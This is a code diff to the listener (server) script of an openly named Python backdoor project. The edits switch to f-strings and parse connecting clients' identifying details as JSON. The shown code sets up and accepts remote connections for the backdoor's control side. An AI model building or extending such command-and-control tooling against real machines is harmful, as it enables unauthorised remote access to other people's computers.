@@ -8,7 +8,7 @@ License: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 NOTE: This program must be used for legal purposes only! I am not responsible for anything you do with it.
 '''
 
-import socket, os, time, threading, sys
+import socket, os, time, threading, sys, json
 from queue import Queue
 
 intThreads = 2
@@ -56,17 +56,17 @@ def create_socket():
         objSocket = socket.socket()
         objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # reuse a socket even if its recently closed
     except socket.error() as strError:
-        print("Error creating socket " + str(strError))
+        print(f"Error creating socket {strError}")
 
 
 def socket_bind():
     global objSocket
     try:
-        print("Listening on port " + str(intPort))
+        print(f"Listening on port {intPort}")
         objSocket.bind((strHost, intPort))
         objSocket.listen(20)
     except socket.error() as strError:
-        print("Error binding socket " + str(strError) + " Retrying...")
+        print(f"Error binding socket {strError} Retrying...")
         socket_bind()
 
 
@@ -75,8 +75,7 @@ def socket_accept():
         try:
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
-            client_info = decode_utf8(conn.recv(intBuff)).split("`,")
-            address += client_info[0], client_info[1], client_info[2],
+            address += tuple(json.loads(decode_utf8(conn.recv(intBuff))))
             arrConnections.append(conn)
             arrAddresses.append(address)
             print("\nConnection has been established: {0} ({1})".format(address[0], address[2]))
